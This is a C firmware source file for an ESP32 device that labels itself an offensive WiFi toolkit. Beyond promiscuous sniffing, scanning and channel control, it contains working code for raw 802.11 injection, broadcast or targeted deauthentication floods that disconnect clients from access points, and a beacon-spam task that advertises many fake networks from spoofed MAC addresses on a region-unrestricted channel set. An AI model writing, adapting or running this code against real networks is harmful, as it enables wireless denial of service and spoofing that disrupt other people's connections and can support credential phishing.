/*
 * nesso_wifi.c — offensive WiFi surface for DAVEY JONES.
 *
 * Supports up to NESSO_WIFI_MAX_PROMISC_SUBS simultaneous promiscuous
 * subscribers. The legacy nesso_wifi_promisc_start() / _stop() API is
 * kept as a convenience wrapper around a single compat slot.
 */

#include <string.h>

#include "esp_check.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "nvs_flash.h"

#include "nesso_wifi.h"

static const char *TAG = "nesso_wifi";

/*
 * esp_wifi_80211_tx lives in esp_wifi.h on IDF 5.3+ but some older headers
 * put it in esp_wifi_internal.h. Forward-declare it here so we don't care
 * which header ships the prototype.
 */
extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer,
                                   int len, bool en_sys_seq);

/* -------------------- module state -------------------- */

typedef struct {
    bool                   active;
    nesso_wifi_packet_cb_t cb;
    void                  *user;
    uint32_t               filter;  /* 0 = all frames */
} promisc_sub_t;

static bool              s_initted          = false;
static bool              s_hw_promisc_on    = false;   /* esp_wifi's current state */
static esp_netif_t      *s_sta_netif        = NULL;
static promisc_sub_t     s_subs[NESSO_WIFI_MAX_PROMISC_SUBS];
static int               s_sub_count        = 0;
/* Compat slot owned by the legacy single-cb API. Non-zero token means we
 * currently hold a subscriber on behalf of nesso_wifi_promisc_start(). */
static nesso_wifi_promisc_sub_t s_compat_token = 0;

/* -------------------- fanout callback -------------------- */

static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    (void)type;
    if (!buf) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const wifi_pkt_rx_ctrl_t     *rx  = &pkt->rx_ctrl;

    /* Snapshot-then-dispatch so unregister during iteration is safe. */
    for (int i = 0; i < NESSO_WIFI_MAX_PROMISC_SUBS; ++i) {
        const promisc_sub_t sub = s_subs[i];  /* struct copy */
        if (sub.active && sub.cb) {
            sub.cb(pkt->payload, rx->sig_len, rx->rssi, rx->channel, sub.user);
        }
    }
}

/* -------------------- filter union -------------------- */

/*
 * The esp_wifi radio hands us whatever frames match the filter mask set
 * via esp_wifi_set_promiscuous_filter. With multiple subscribers we set
 * the radio filter to the OR of every subscriber's mask — if anyone asks
 * for a frame type, the radio has to capture it; individual subscribers
 * still inspect the frames themselves for finer filtering.
 *
 * Subscriber filter=0 means "give me everything" and wins the union.
 */
static uint32_t compute_filter_union(void)
{
    uint32_t combined = 0;
    for (int i = 0; i < NESSO_WIFI_MAX_PROMISC_SUBS; ++i) {
        if (!s_subs[i].active) continue;
        if (s_subs[i].filter == 0) return 0;  /* 0 = "all frames", short-circuit */
        combined |= s_subs[i].filter;
    }
    return combined;
}

static esp_err_t apply_radio_filter(void)
{
    uint32_t combined = compute_filter_union();
    /* OUR convention: 0 = "all frames".
     * ESP-IDF convention: 0 = "capture nothing", 0xFFFFFFFF = "all frames".
     * Map between the two. */
    if (combined == 0) {
        combined = WIFI_PROMIS_FILTER_MASK_ALL;
    }
    wifi_promiscuous_filter_t pf = { .filter_mask = combined };
    return esp_wifi_set_promiscuous_filter(&pf);
}

/* -------------------- subscriber API -------------------- */

esp_err_t nesso_wifi_promisc_add_subscriber(nesso_wifi_packet_cb_t cb,
                                             void *user,
                                             uint32_t filter,
                                             nesso_wifi_promisc_sub_t *out_token)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (!cb)        return ESP_ERR_INVALID_ARG;

    int slot = -1;
    for (int i = 0; i < NESSO_WIFI_MAX_PROMISC_SUBS; ++i) {
        if (!s_subs[i].active) { slot = i; break; }
    }
    if (slot < 0) {
        ESP_LOGE(TAG, "no free promisc subscriber slots (max %d)",
                 NESSO_WIFI_MAX_PROMISC_SUBS);
        return ESP_ERR_NO_MEM;
    }

    /*
     * Stage the subscriber in a temporary so we can compute the prospective
     * filter union *including* this subscriber, push it to the radio, and
     * enable promiscuous mode — all before we commit the slot. If any
     * esp_wifi call fails, we return the error without touching s_subs,
     * leaving the table clean.
     */
    const bool was_hw_on = s_hw_promisc_on;

    /* Compute the filter union if we committed this subscriber. */
    uint32_t prospective = 0;
    bool any_zero = (filter == 0);
    if (!any_zero) {
        for (int i = 0; i < NESSO_WIFI_MAX_PROMISC_SUBS; ++i) {
            if (!s_subs[i].active) continue;
            if (s_subs[i].filter == 0) { any_zero = true; break; }
            prospective |= s_subs[i].filter;
        }
    }
    if (!any_zero) prospective |= filter;
    else           prospective  = 0;  /* "all frames" */

    if (!was_hw_on) {
        esp_err_t err = esp_wifi_set_promiscuous_rx_cb(promisc_cb);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "set promisc cb: %s", esp_err_to_name(err));
            return err;
        }
    }

    /* Map our "0 = all frames" convention to ESP-IDF's 0xFFFFFFFF. */
    if (prospective == 0) prospective = WIFI_PROMIS_FILTER_MASK_ALL;
    wifi_promiscuous_filter_t pf = { .filter_mask = prospective };
    esp_err_t err = esp_wifi_set_promiscuous_filter(&pf);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set promisc filter: %s", esp_err_to_name(err));
        return err;
    }

    if (!was_hw_on) {
        err = esp_wifi_set_promiscuous(true);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "enable promisc: %s", esp_err_to_name(err));
            return err;
        }
        s_hw_promisc_on = true;
    }

    /* Commit the slot only after all hardware calls succeed. */
    s_subs[slot].cb     = cb;
    s_subs[slot].user   = user;
    s_subs[slot].filter = filter;
    s_subs[slot].active = true;
    s_sub_count++;

    if (out_token) *out_token = slot + 1;  /* 1-based so 0 means "unassigned" */
    ESP_LOGI(TAG, "promisc sub added slot=%d filter=0x%08lx (total=%d)",
             slot, (unsigned long)filter, s_sub_count);
    return ESP_OK;
}

esp_err_t nesso_wifi_promisc_remove_subscriber(nesso_wifi_promisc_sub_t token)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    int slot = token - 1;
    if (slot < 0 || slot >= NESSO_WIFI_MAX_PROMISC_SUBS) return ESP_ERR_INVALID_ARG;
    if (!s_subs[slot].active) return ESP_ERR_INVALID_ARG;

    s_subs[slot].active = false;
    s_subs[slot].cb     = NULL;
    s_subs[slot].user   = NULL;
    s_subs[slot].filter = 0;
    s_sub_count--;

    if (s_sub_count == 0) {
        if (s_hw_promisc_on) {
            esp_wifi_set_promiscuous(false);
            s_hw_promisc_on = false;
        }
    } else {
        /* Re-apply the reduced filter union so the radio drops frame types
         * nobody wants anymore. */
        (void)apply_radio_filter();
    }
    ESP_LOGI(TAG, "promisc sub removed slot=%d (total=%d)", slot, s_sub_count);
    return ESP_OK;
}

/* -------------------- legacy single-callback API -------------------- */

esp_err_t nesso_wifi_promisc_start(nesso_wifi_packet_cb_t cb, void *user,
                                    uint32_t filter)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    /* Drop the previous compat subscriber if there was one — legacy users
     * expect start() to replace, not stack. */
    if (s_compat_token) {
        (void)nesso_wifi_promisc_remove_subscriber(s_compat_token);
        s_compat_token = 0;
    }
    return nesso_wifi_promisc_add_subscriber(cb, user, filter, &s_compat_token);
}

esp_err_t nesso_wifi_promisc_stop(void)
{
    if (!s_initted) return ESP_OK;
    if (s_compat_token) {
        esp_err_t err = nesso_wifi_promisc_remove_subscriber(s_compat_token);
        s_compat_token = 0;
        return err;
    }
    return ESP_OK;
}

bool nesso_wifi_promisc_is_on(void) { return s_hw_promisc_on; }

/* -------------------- helpers -------------------- */

static uint32_t to_u32(wifi_auth_mode_t a) { return (uint32_t)a; }

/* -------------------- init / deinit -------------------- */

esp_err_t nesso_wifi_init(void)
{
    if (s_initted) return ESP_OK;

    /* NVS must be initialized before esp_wifi_init — WiFi stores calibration
     * data and config there. Tolerate double-init. */
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_LOGW(TAG, "NVS partition full or outdated, erasing...");
        nvs_flash_erase();
        err = nvs_flash_init();
    }
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "nvs_flash_init: %s", esp_err_to_name(err));
        return err;
    }

    /* netif + event loop (tolerant of double-create). */
    err = esp_netif_init();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "esp_netif_init: %s", esp_err_to_name(err));
        return err;
    }
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "event loop: %s", esp_err_to_name(err));
        return err;
    }
    if (!s_sta_netif) s_sta_netif = esp_netif_create_default_wifi_sta();

    wifi_init_config_t wcfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_RETURN_ON_ERROR(esp_wifi_init(&wcfg), TAG, "esp_wifi_init");

    /* RAM storage — no NVS writes on every scan. */
    ESP_RETURN_ON_ERROR(esp_wifi_set_storage(WIFI_STORAGE_RAM), TAG, "set storage");

    /* STA mode so we can scan + inject. */
    ESP_RETURN_ON_ERROR(esp_wifi_set_mode(WIFI_MODE_STA), TAG, "set mode");

    /* Permissive country — all 13 channels. */
    wifi_country_t cc = {
        .cc     = "01",   /* "world" */
        .schan  = 1,
        .nchan  = 13,
        .policy = WIFI_COUNTRY_POLICY_MANUAL,
    };
    (void)esp_wifi_set_country(&cc);

    ESP_RETURN_ON_ERROR(esp_wifi_start(), TAG, "wifi start");
    (void)esp_wifi_set_ps(WIFI_PS_NONE);

    memset(s_subs, 0, sizeof(s_subs));
    s_sub_count     = 0;
    s_compat_token  = 0;
    s_hw_promisc_on = false;
    s_initted       = true;
    ESP_LOGI(TAG, "wifi up (STA mode, power-save off)");
    return ESP_OK;
}

esp_err_t nesso_wifi_deinit(void)
{
    if (!s_initted) return ESP_OK;

    /* Drop all subscribers first so the hardware unwinds cleanly. */
    for (int i = 0; i < NESSO_WIFI_MAX_PROMISC_SUBS; ++i) {
        if (s_subs[i].active) {
            s_subs[i].active = false;
            s_subs[i].cb = NULL;
            s_subs[i].user = NULL;
            s_subs[i].filter = 0;
        }
    }
    s_sub_count    = 0;
    s_compat_token = 0;
    if (s_hw_promisc_on) {
        esp_wifi_set_promiscuous(false);
        s_hw_promisc_on = false;
    }

    esp_wifi_stop();
    esp_wifi_deinit();
    if (s_sta_netif) {
        esp_netif_destroy_default_wifi(s_sta_netif);
        s_sta_netif = NULL;
    }
    s_initted = false;
    return ESP_OK;
}

/* -------------------- scan -------------------- */

esp_err_t nesso_wifi_scan(nesso_wifi_ap_t *out, size_t max_results,
                          size_t *out_count)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (out_count) *out_count = 0;

    /*
     * esp_wifi_scan_start requires promiscuous off. Temporarily drop the
     * hardware into non-promisc mode WITHOUT touching the subscriber list
     * — once scan is done, we'll flip it back on and the existing
     * subscribers resume receiving frames as if nothing happened.
     */
    bool restore = s_hw_promisc_on;
    if (restore) {
        esp_wifi_set_promiscuous(false);
        s_hw_promisc_on = false;
    }

    wifi_scan_config_t scfg = {
        .ssid        = NULL,
        .bssid       = NULL,
        .channel     = 0,          /* 0 = all */
        .show_hidden = true,
        .scan_type   = WIFI_SCAN_TYPE_ACTIVE,
    };
    scfg.scan_time.active.min = 60;
    scfg.scan_time.active.max = 120;

    esp_err_t err = esp_wifi_scan_start(&scfg, true /* blocking */);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "scan start: %s", esp_err_to_name(err));
        goto out;
    }

    uint16_t n = 0;
    err = esp_wifi_scan_get_ap_num(&n);
    if (err != ESP_OK || n == 0) {
        if (err != ESP_OK) ESP_LOGW(TAG, "get ap num: %s", esp_err_to_name(err));
        goto out;
    }

    wifi_ap_record_t *tmp = calloc(n, sizeof(*tmp));
    if (!tmp) { err = ESP_ERR_NO_MEM; goto out; }

    err = esp_wifi_scan_get_ap_records(&n, tmp);
    if (err != ESP_OK) {
        free(tmp);
        goto out;
    }

    size_t copied = 0;
    if (out) {
        const size_t cap = max_results;
        for (uint16_t i = 0; i < n && copied < cap; ++i) {
            memcpy(out[copied].bssid, tmp[i].bssid, 6);
            size_t ssid_len = strnlen((const char *)tmp[i].ssid, 32);
            memcpy(out[copied].ssid, tmp[i].ssid, ssid_len);
            out[copied].ssid[ssid_len] = '\0';
            out[copied].primary_channel = tmp[i].primary;
            out[copied].rssi            = tmp[i].rssi;
            out[copied].auth_mode       = to_u32(tmp[i].authmode);
            out[copied].hidden          = (ssid_len == 0);
            copied++;
        }
    } else {
        copied = n;
    }
    free(tmp);

    if (out_count) *out_count = copied;
    ESP_LOGI(TAG, "scan: %u APs total, %zu copied", n, copied);

out:
    if (restore && s_sub_count > 0) {
        /* Subscribers are still registered — just bring the hardware back. */
        (void)apply_radio_filter();
        if (esp_wifi_set_promiscuous(true) == ESP_OK) {
            s_hw_promisc_on = true;
        }
    }
    return err;
}

/* -------------------- channel -------------------- */

esp_err_t nesso_wifi_set_channel(uint8_t channel)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (channel < NESSO_WIFI_CHAN_MIN || channel > NESSO_WIFI_CHAN_MAX) {
        return ESP_ERR_INVALID_ARG;
    }
    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t nesso_wifi_get_channel(uint8_t *out_channel)
{
    if (!s_initted || !out_channel) return ESP_ERR_INVALID_ARG;
    wifi_second_chan_t second;
    return esp_wifi_get_channel(out_channel, &second);
}

/* -------------------- raw 802.11 TX -------------------- */

esp_err_t nesso_wifi_raw_tx(const uint8_t *frame, size_t len, bool use_own_seq)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (!frame || len < 24) return ESP_ERR_INVALID_ARG;

    /* en_sys_seq: true = driver assigns seq, false = frame carries its own.
     * We flip the parameter sense so the API reads naturally. */
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)len, !use_own_seq);
}

/* -------------------- crafted deauth -------------------- */

/*
 * 802.11 deauthentication frame layout (26 bytes):
 *
 *   0 : frame control [0xC0, 0x00]  — type=mgmt, subtype=deauth
 *   2 : duration      [0x3A, 0x01]  — 314 µs, typical
 *   4 : addr1 (RA/destination)       6 bytes
 *  10 : addr2 (TA/source)            6 bytes — must equal BSSID
 *  16 : addr3 (BSSID)                6 bytes
 *  22 : sequence control [0, 0]     — driver will fill in
 *  24 : reason code                  2 bytes, little-endian
 */
static const uint8_t s_broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

esp_err_t nesso_wifi_send_deauth(const uint8_t ap_bssid[6],
                                  const uint8_t target_mac[6],
                                  uint16_t reason,
                                  uint16_t count)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (!ap_bssid || count == 0) return ESP_ERR_INVALID_ARG;

    const uint8_t *dst = target_mac ? target_mac : s_broadcast;

    uint8_t frame[26] = {
        0xC0, 0x00,                  /* frame control */
        0x3A, 0x01,                  /* duration */
        0,0,0,0,0,0,                 /* addr1 — filled below */
        0,0,0,0,0,0,                 /* addr2 — BSSID */
        0,0,0,0,0,0,                 /* addr3 — BSSID */
        0x00, 0x00,                  /* seq ctrl */
        0x00, 0x00,                  /* reason — filled below */
    };
    memcpy(&frame[4],  dst,      6);
    memcpy(&frame[10], ap_bssid, 6);
    memcpy(&frame[16], ap_bssid, 6);
    frame[24] = (uint8_t)(reason & 0xFF);
    frame[25] = (uint8_t)(reason >> 8);

    for (uint16_t i = 0; i < count; ++i) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame),
                                          true /* en_sys_seq */);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "deauth tx %u/%u failed: %s",
                     i, count, esp_err_to_name(err));
            return err;
        }
        if (count > 1) vTaskDelay(pdMS_TO_TICKS(2));
    }
    return ESP_OK;
}

/* -------------------- beacon spam -------------------- */

static TaskHandle_t s_spam_task = NULL;
static const char **s_spam_ssids = NULL;
static size_t       s_spam_count = 0;
static bool         s_spam_running = false;

/*
 * Craft a minimal beacon frame for a given SSID.
 * Returns frame length. Buffer must be >= 128 bytes.
 */
static int craft_beacon(uint8_t *frame, const char *ssid, uint8_t channel)
{
    memset(frame, 0, 128);
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    /* Frame control: beacon (0x80 0x00). */
    frame[0] = 0x80; frame[1] = 0x00;
    /* Duration. */
    frame[2] = 0x00; frame[3] = 0x00;
    /* Addr1: broadcast. */
    memset(frame + 4, 0xFF, 6);
    /* Addr2: random-ish source MAC. */
    frame[10] = 0xDE; frame[11] = 0xAD;
    frame[12] = 0xBE; frame[13] = 0xEF;
    frame[14] = (uint8_t)(ssid_len ^ 0x42);
    frame[15] = (uint8_t)(channel ^ 0x13);
    /* Addr3: same as addr2 (BSSID). */
    memcpy(frame + 16, frame + 10, 6);
    /* Seq ctrl. */
    frame[22] = 0x00; frame[23] = 0x00;

    /* Fixed body: timestamp(8) + beacon_interval(2) + capability(2). */
    int p = 24;
    memset(frame + p, 0, 8); p += 8;  /* timestamp */
    frame[p] = 0x64; frame[p+1] = 0x00; p += 2;  /* 100 TU interval */
    frame[p] = 0x31; frame[p+1] = 0x04; p += 2;  /* capability: ESS + privacy */

    /* Tag 0: SSID. */
    frame[p++] = 0x00;
    frame[p++] = (uint8_t)ssid_len;
    memcpy(frame + p, ssid, ssid_len);
    p += ssid_len;

    /* Tag 1: Supported rates (mandatory). */
    frame[p++] = 0x01;
    frame[p++] = 0x04;
    frame[p++] = 0x82; frame[p++] = 0x84;
    frame[p++] = 0x8b; frame[p++] = 0x96;

    /* Tag 3: DS parameter set — channel. */
    frame[p++] = 0x03;
    frame[p++] = 0x01;
    frame[p++] = channel;

    return p;
}

static void spam_task(void *arg)
{
    (void)arg;
    uint8_t frame[128];
    uint8_t ch = 0;
    nesso_wifi_get_channel(&ch);
    if (ch == 0) ch = 1;

    while (s_spam_running) {
        for (size_t i = 0; i < s_spam_count && s_spam_running; ++i) {
            int len = craft_beacon(frame, s_spam_ssids[i], ch);
            /* Vary the source MAC per SSID so each appears as a different AP. */
            frame[14] = (uint8_t)(i & 0xFF);
            frame[15] = (uint8_t)((i >> 8) & 0xFF);
            memcpy(frame + 16, frame + 10, 6);  /* sync addr3 = addr2 */
            esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    s_spam_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t nesso_wifi_beacon_spam_start(const char **ssids, size_t count,
                                        uint8_t channel)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (s_spam_running) return ESP_OK;
    if (!ssids || count == 0) return ESP_ERR_INVALID_ARG;

    if (channel > 0) nesso_wifi_set_channel(channel);

    s_spam_ssids   = ssids;
    s_spam_count   = count;
    s_spam_running = true;

    BaseType_t ok = xTaskCreate(spam_task, "bcn_spam", 4096, NULL, 5, &s_spam_task);
    if (ok != pdPASS) {
        s_spam_running = false;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "beacon spam started: %zu SSIDs", count);
    return ESP_OK;
}

esp_err_t nesso_wifi_beacon_spam_stop(void)
{
    if (!s_spam_running) return ESP_OK;
    s_spam_running = false;
    for (int i = 0; i < 20 && s_spam_task; ++i) vTaskDelay(pdMS_TO_TICKS(50));
    ESP_LOGI(TAG, "beacon spam stopped");
    return ESP_OK;
}

bool nesso_wifi_beacon_spam_is_active(void) { return s_spam_running; }
